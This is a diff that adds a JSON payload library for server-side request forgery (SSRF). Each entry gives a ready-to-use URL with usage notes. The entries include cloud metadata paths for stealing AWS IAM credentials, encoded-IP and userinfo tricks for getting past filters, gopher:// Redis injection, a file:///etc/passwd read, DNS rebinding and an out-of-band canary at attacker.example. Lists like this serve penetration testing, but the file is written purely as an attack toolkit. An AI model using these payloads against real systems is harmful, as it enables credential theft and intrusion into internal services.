@@ -1,0 +1,146 @@
+{
+  "id": "ssrf",
+  "label": "SSRF",
+  "entries": [
+    {
+      "id": "loopback-ip",
+      "label": "Loopback IP",
+      "payload": "http://127.0.0.1/",
+      "notes": "Baseline probe: reach the loopback interface the server sees but the client cannot.",
+      "tags": ["localhost-bypass", "canonical"]
+    },
+    {
+      "id": "loopback-name",
+      "label": "Loopback hostname",
+      "payload": "http://localhost/",
+      "notes": "Hostname form behaves differently from the raw IP when allowlists or resolvers treat them apart.",
+      "tags": ["localhost-bypass"]
+    },
+    {
+      "id": "aws-imds-root",
+      "label": "AWS metadata root",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "notes": "AWS instance metadata service; high-value SSRF target for role credentials.",
+      "tags": ["cloud-metadata", "aws", "canonical"]
+    },
+    {
+      "id": "aws-imds-creds",
+      "label": "AWS IAM credentials path",
+      "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "notes": "Lists IAM role names; read one to retrieve temporary AWS keys.",
+      "tags": ["cloud-metadata", "aws"]
+    },
+    {
+      "id": "aws-imdsv2-token",
+      "label": "AWS IMDSv2 token endpoint",
+      "payload": "http://169.254.169.254/latest/api/token",
+      "notes": "IMDSv2 needs a PUT with a TTL header; relevant when v1 is disabled.",
+      "tags": ["cloud-metadata", "aws"]
+    },
+    {
+      "id": "gcp-metadata",
+      "label": "GCP metadata root",
+      "payload": "http://metadata.google.internal/computeMetadata/v1/",
+      "notes": "GCP metadata; modern setups require the Metadata-Flavor: Google header.",
+      "tags": ["cloud-metadata", "gcp"]
+    },
+    {
+      "id": "azure-imds",
+      "label": "Azure IMDS",
+      "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+      "notes": "Azure metadata; requires the Metadata: true header.",
+      "tags": ["cloud-metadata", "azure"]
+    },
+    {
+      "id": "decimal-ip",
+      "label": "Decimal-encoded loopback",
+      "payload": "http://2130706433/",
+      "notes": "127.0.0.1 as a 32-bit decimal integer; bypasses string allowlists of the dotted form.",
+      "tags": ["decimal-ip", "localhost-bypass"]
+    },
+    {
+      "id": "octal-ip",
+      "label": "Octal-encoded loopback",
+      "payload": "http://0177.0.0.1/",
+      "notes": "Octal first octet; many parsers accept it where filters do not.",
+      "tags": ["octal-ip", "localhost-bypass"]
+    },
+    {
+      "id": "hex-ip",
+      "label": "Hex-encoded loopback",
+      "payload": "http://0x7f000001/",
+      "notes": "Hex form of 127.0.0.1; another numeric encoding to dodge literal-string blocks.",
+      "tags": ["localhost-bypass"]
+    },
+    {
+      "id": "ipv6-loopback",
+      "label": "IPv6 loopback",
+      "payload": "http://[::1]/",
+      "notes": "IPv6 loopback bypasses IPv4-only allowlists.",
+      "tags": ["ipv6", "localhost-bypass"]
+    },
+    {
+      "id": "ipv6-mapped",
+      "label": "IPv4-mapped IPv6 loopback",
+      "payload": "http://[::ffff:127.0.0.1]/",
+      "notes": "Reaches loopback through the IPv6 stack via a mapped address.",
+      "tags": ["ipv6", "localhost-bypass"]
+    },
+    {
+      "id": "dns-rebind",
+      "label": "DNS rebinding host",
+      "payload": "http://rebind.attacker.example/",
+      "notes": "Resolves public on first lookup then to 127.0.0.1, beating check-then-fetch TOCTOU.",
+      "tags": ["dns-rebind", "blind"]
+    },
+    {
+      "id": "open-redirect-chain",
+      "label": "Redirect to internal target",
+      "payload": "http://allowed.example/redirect?url=http://169.254.169.254/",
+      "notes": "An allowlisted host 302-redirects to an internal target the fetcher follows.",
+      "tags": ["redirect"]
+    },
+    {
+      "id": "userinfo-confusion",
+      "label": "Userinfo @ confusion",
+      "payload": "http://allowed.example@169.254.169.254/",
+      "notes": "Parsers that read the host as allowed.example still connect to the IP after the @.",
+      "tags": ["localhost-bypass", "waf-bypass"]
+    },
+    {
+      "id": "gopher-redis",
+      "label": "gopher:// Redis smuggling",
+      "payload": "gopher://127.0.0.1:6379/_PING%0d%0a",
+      "notes": "gopher:// crafts raw TCP bytes — here a Redis command — turning SSRF into internal protocol injection.",
+      "tags": ["gopher", "protocol-smuggling"]
+    },
+    {
+      "id": "dict-memcached",
+      "label": "dict:// service probe",
+      "payload": "dict://127.0.0.1:11211/stat",
+      "notes": "dict:// reaches line-based services such as memcached for read or interaction.",
+      "tags": ["protocol-smuggling"]
+    },
+    {
+      "id": "file-scheme",
+      "label": "file:// local read",
+      "payload": "file:///etc/passwd",
+      "notes": "file:// turns a URL fetcher into a local file read.",
+      "tags": ["file-scheme", "linux"]
+    },
+    {
+      "id": "internal-port",
+      "label": "Internal port probe",
+      "payload": "http://127.0.0.1:8080/",
+      "notes": "Vary the port to map internal services from response or timing differences.",
+      "tags": ["blind"]
+    },
+    {
+      "id": "oob-canary",
+      "label": "Out-of-band canary",
+      "payload": "http://canary.attacker.example/ssrf",
+      "notes": "A hit on your server confirms blind SSRF when no response is reflected in-band.",
+      "tags": ["blind"]
+    }
+  ]
+}
